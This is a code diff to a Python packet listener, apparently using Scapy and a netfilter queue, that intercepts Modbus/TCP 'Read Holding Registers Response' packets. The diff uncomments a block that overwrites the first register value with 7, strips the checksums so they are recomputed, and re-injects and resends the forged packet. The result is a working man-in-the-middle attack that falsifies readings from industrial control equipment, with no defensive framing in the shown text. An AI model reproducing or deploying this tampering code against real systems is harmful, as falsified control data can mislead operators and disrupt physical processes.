@@ -29,25 +29,25 @@ def packet_listener(packet):
         print("Write register is:", pl['Write Single Register'])
        
     
-    '''
+    
     elif pl.haslayer("Read Holding Registers Response"):
-        print("Register response is:", pl['Read Holding Registers Response'].registerVal)
-        print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
+      print("Register response is:", pl['Read Holding Registers Response'].registerVal)
+      print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
       #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
-        pload2=pl['Read Holding Registers Response'].registerVal
-      
-       	pload2[0]=7
-        print('payload2 is ',pload2)
+      pload2=pl['Read Holding Registers Response'].registerVal
+
+      pload2[0]=7
+      print('payload2 is ',pload2)
       #pl['Write Single Register'].remove_payload
-        pl['Read Holding Registers Response'].registerVal=pload2
-        print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
-        del pl[TCP].chksum
-        del pl[IP].chksum
-        packet.set_payload(bytes(pl))
-        #packet.drop()
-        pl.show() 
+      pl['Read Holding Registers Response'].registerVal=pload2
+      print('the new payload is ',pl['Read Holding Registers Response'].registerVal)
+      del pl[TCP].chksum
+      del pl[IP].chksum
+      packet.set_payload(bytes(pl))
+      #packet.drop()
+      pl.show() 
         
-     '''    
+     
     
     #pl.show()  
     send(pl)
